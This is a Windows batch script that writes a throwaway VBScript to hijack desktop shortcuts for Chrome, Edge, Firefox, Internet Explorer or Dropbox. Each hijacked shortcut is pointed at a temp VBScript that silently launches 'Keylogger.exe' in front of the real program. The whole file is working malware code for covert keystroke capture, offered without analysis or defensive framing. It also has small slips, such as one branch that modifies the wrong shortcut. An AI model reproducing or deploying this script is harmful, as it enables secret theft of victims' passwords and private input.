@echo off

set SCRIPT="%TEMP%\%RANDOM%-%RANDOM%-%RANDOM%-%RANDOM%.vbs"

if exist "%USERPROFILE%\Desktop\Chrome.lnk" (
	echo Set oWS = WScript.CreateObject("WScript.Shell") >> %SCRIPT%
	echo sLinkFile = "%USERPROFILE%\Desktop\Chrome.lnk" >> %SCRIPT%
	echo Set oLink = oWS.CreateShortcut(sLinkFile) >> %SCRIPT%
	if exist "%ProgramFiles(x86)%" (
		echo oLink.TargetPath = "%LocalAppData%\Temp\17.vbs" >> %SCRIPT%
		echo >>"%LocalAppData%\Temp\17.vbs" CreateObject("Wscript.Shell").Run """Keylogger.exe"" ""C:Program Files (x86)/Google/Chrome/Application/chrome.exe""", 0, False
	) else (
		echo oLink.TargetPath = "%LocalAppData%\Temp\17.vbs" >> %SCRIPT%
		echo >>"%LocalAppData%\Temp\17.vbs" CreateObject("Wscript.Shell").Run """Keylogger.exe"" ""%ProgramFiles%\Google\Chrome\Application\chrome.exe""", 0, False
	)
	echo oLink.Save >> %SCRIPT%
	cscript /nologo %SCRIPT%
) else if exist "%USERPROFILE%\Desktop\Google Chrome.lnk" (
	echo Set oWS = WScript.CreateObject("WScript.Shell") >> %SCRIPT%
	echo sLinkFile = "%USERPROFILE%\Desktop\Chrome.lnk" >> %SCRIPT%
	echo Set oLink = oWS.CreateShortcut(sLinkFile) >> %SCRIPT%
	if exist "%ProgramFiles(x86)%" (
		echo oLink.TargetPath = "%LocalAppData%\Temp\17.vbs" >> %SCRIPT%
		echo >>"%LocalAppData%\Temp\17.vbs" CreateObject("Wscript.Shell").Run """Keylogger.exe"" ""%ProgramFiles(x86)%\Google\Chrome\Application\chrome.exe""", 0, False
	) else (
		echo oLink.TargetPath = "%LocalAppData%\Temp\17.vbs" >> %SCRIPT%
		echo >>"%LocalAppData%\Temp\17.vbs" CreateObject("Wscript.Shell").Run """Keylogger.exe"" ""%ProgramFiles%\Google\Chrome\Application\chrome.exe""", 0, False
	)
	echo oLink.Save >> %SCRIPT%
	cscript /nologo %SCRIPT%
) else if exist "%USERPROFILE%\Desktop\Microsoft Edge.lnk" (
	echo Set oWS = WScript.CreateObject("WScript.Shell") >> %SCRIPT%
	echo sLinkFile = "%USERPROFILE%\Desktop\Microsoft Edge.lnk" >> %SCRIPT%
	echo Set oLink = oWS.CreateShortcut(sLinkFile) >> %SCRIPT%
	if exist "%ProgramFiles(x86)%" (
		echo oLink.TargetPath = "%LocalAppData%\Temp\17.vbs" >> %SCRIPT%
		echo >>"%LocalAppData%\Temp\17.vbs" CreateObject("Wscript.Shell").Run """Keylogger.exe"" ""%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe""", 0, False
	) else (
		echo oLink.TargetPath = "%LocalAppData%\Temp\17.vbs" >> %SCRIPT%
		echo >>"%LocalAppData%\Temp\17.vbs" CreateObject("Wscript.Shell").Run """Keylogger.exe"" ""%ProgramFiles%\Microsoft\Edge\Application\msedge.exe""", 0, False
	)
	echo oLink.Save >> %SCRIPT%
	cscript /nologo %SCRIPT%
) else if exist "%USERPROFILE%\Desktop\Mozilla Firefox.lnk" (
	echo Set oWS = WScript.CreateObject("WScript.Shell") >> %SCRIPT%
	echo sLinkFile = "%USERPROFILE%\Desktop\Mozilla Firefox.lnk" >> %SCRIPT%
	echo Set oLink = oWS.CreateShortcut(sLinkFile) >> %SCRIPT%
	if exist "%ProgramFiles(x86)%" (
		echo oLink.TargetPath = "%LocalAppData%\Temp\17.vbs" >> %SCRIPT%
		echo >>"%LocalAppData%\Temp\17.vbs" CreateObject("Wscript.Shell").Run """Keylogger.exe"" ""%ProgramFiles(x86)%\Mozilla Firefox\firefox.exe""", 0, False
	) else (
		echo oLink.TargetPath = "%LocalAppData%\Temp\17.vbs" >> %SCRIPT%
		echo >>"%LocalAppData%\Temp\17.vbs" CreateObject("Wscript.Shell").Run """Keylogger.exe"" ""%ProgramFiles%\Mozilla Firefox\firefox.exe""", 0, False
	)
	echo oLink.Save >> %SCRIPT%
	cscript /nologo %SCRIPT%
) else if exist "%USERPROFILE%\Desktop\Firefox.lnk" (
	echo Set oWS = WScript.CreateObject("WScript.Shell") >> %SCRIPT%
	echo sLinkFile = "%USERPROFILE%\Desktop\Firefox.lnk" >> %SCRIPT%
	echo Set oLink = oWS.CreateShortcut(sLinkFile) >> %SCRIPT%
	if exist "%ProgramFiles(x86)%" (
		echo oLink.TargetPath = "%LocalAppData%\Temp\17.vbs" >> %SCRIPT%
		echo >>"%LocalAppData%\Temp\17.vbs" CreateObject("Wscript.Shell").Run """Keylogger.exe"" ""%ProgramFiles(x86)%\Mozilla Firefox\firefox.exe""", 0, False
	) else (
		echo oLink.TargetPath = "%LocalAppData%\Temp\17.vbs" >> %SCRIPT%
		echo >>"%LocalAppData%\Temp\17.vbs" CreateObject("Wscript.Shell").Run """Keylogger.exe"" ""%ProgramFiles%\Mozilla Firefox\firefox.exe""", 0, False
	)
	echo oLink.Save >> %SCRIPT%
	cscript /nologo %SCRIPT%
) else if exist "%USERPROFILE%\Desktop\Internet Explorer Browser.lnk" (
	echo Set oWS = WScript.CreateObject("WScript.Shell") >> %SCRIPT%
	echo sLinkFile = "%USERPROFILE%\Desktop\Internet Explorer Browser.lnk" >> %SCRIPT%
	echo Set oLink = oWS.CreateShortcut(sLinkFile) >> %SCRIPT%
	if exist "%ProgramFiles(x86)%" (
		echo oLink.TargetPath = "%LocalAppData%\Temp\17.vbs" >> %SCRIPT%
		echo >>"%LocalAppData%\Temp\17.vbs" CreateObject("Wscript.Shell").Run """Keylogger.exe"" ""%ProgramFiles(x86)%\Internet Explorer\iexplore.exe""", 0, False
	) else (
		echo oLink.TargetPath = "%LocalAppData%\Temp\17.vbs" >> %SCRIPT%
		echo >>"%LocalAppData%\Temp\17.vbs" CreateObject("Wscript.Shell").Run """Keylogger.exe"" ""%ProgramFiles%\Internet Explorer\iexplore.exe""", 0, False
	)
	echo oLink.Save >> %SCRIPT%
	cscript /nologo %SCRIPT%
) else if exist "%USERPROFILE%\Desktop\Internet Explorer.lnk" (
	echo Set oWS = WScript.CreateObject("WScript.Shell") >> %SCRIPT%
	echo sLinkFile = "%USERPROFILE%\Desktop\Internet Explorer.lnk" >> %SCRIPT%
	echo Set oLink = oWS.CreateShortcut(sLinkFile) >> %SCRIPT%
	if exist "%ProgramFiles(x86)%" (
		echo oLink.TargetPath = "%LocalAppData%\Temp\17.vbs" >> %SCRIPT%
		echo >>"%LocalAppData%\Temp\17.vbs" CreateObject("Wscript.Shell").Run """Keylogger.exe"" ""%ProgramFiles(x86)%\Internet Explorer\iexplore.exe""", 0, False
	) else (
		echo oLink.TargetPath = "%LocalAppData%\Temp\17.vbs" >> %SCRIPT%
		echo >>"%LocalAppData%\Temp\17.vbs" CreateObject("Wscript.Shell").Run """Keylogger.exe"" ""%ProgramFiles%\Internet Explorer\iexplore.exe""", 0, False
	)
	echo oLink.Save >> %SCRIPT%
	cscript /nologo %SCRIPT%
) else if exist "%USERPROFILE%\Desktop\Explorer.lnk" (
	echo Set oWS = WScript.CreateObject("WScript.Shell") >> %SCRIPT%
	echo sLinkFile = "%USERPROFILE%\Desktop\Explorer.lnk" >> %SCRIPT%
	echo Set oLink = oWS.CreateShortcut(sLinkFile) >> %SCRIPT%
	if exist "%ProgramFiles(x86)%" (
		echo oLink.TargetPath = "%LocalAppData%\Temp\17.vbs" >> %SCRIPT%
		echo >>"%LocalAppData%\Temp\17.vbs" CreateObject("Wscript.Shell").Run """Keylogger.exe"" ""%ProgramFiles(x86)%\Internet Explorer\iexplore.exe""", 0, False
	) else (
		echo oLink.TargetPath = "%LocalAppData%\Temp\17.vbs" >> %SCRIPT%
		echo >>"%LocalAppData%\Temp\17.vbs" CreateObject("Wscript.Shell").Run """Keylogger.exe"" ""%ProgramFiles%\Internet Explorer\iexplore.exe""", 0, False
	)
	echo oLink.Save >> %SCRIPT%
	cscript /nologo %SCRIPT%
) else if exist "%USERPROFILE%\Desktop\Dropbox.lnk" (
	echo Set oWS = WScript.CreateObject("WScript.Shell") >> %SCRIPT%
	echo sLinkFile = "%USERPROFILE%\Desktop\Dropbox.lnk" >> %SCRIPT%
	echo Set oLink = oWS.CreateShortcut(sLinkFile) >> %SCRIPT%
	if exist "%ProgramFiles(x86)%" (
		echo oLink.TargetPath = "%LocalAppData%\Temp\17.vbs" >> %SCRIPT%
		echo >>"%LocalAppData%\Temp\17.vbs" CreateObject("Wscript.Shell").Run """Keylogger.exe"" ""%ProgramFiles(x86)%\Dropbox\Client\Dropbox.exe""", 0, False
	) else (
		echo oLink.TargetPath = "%LocalAppData%\Temp\17.vbs" >> %SCRIPT%
		echo >>"%LocalAppData%\Temp\17.vbs" CreateObject("Wscript.Shell").Run """Keylogger.exe"" ""%ProgramFiles%\Dropbox\Client\Dropbox.exe""", 0, False
	)
	echo oLink.Save >> %SCRIPT%
	cscript /nologo %SCRIPT%
) 
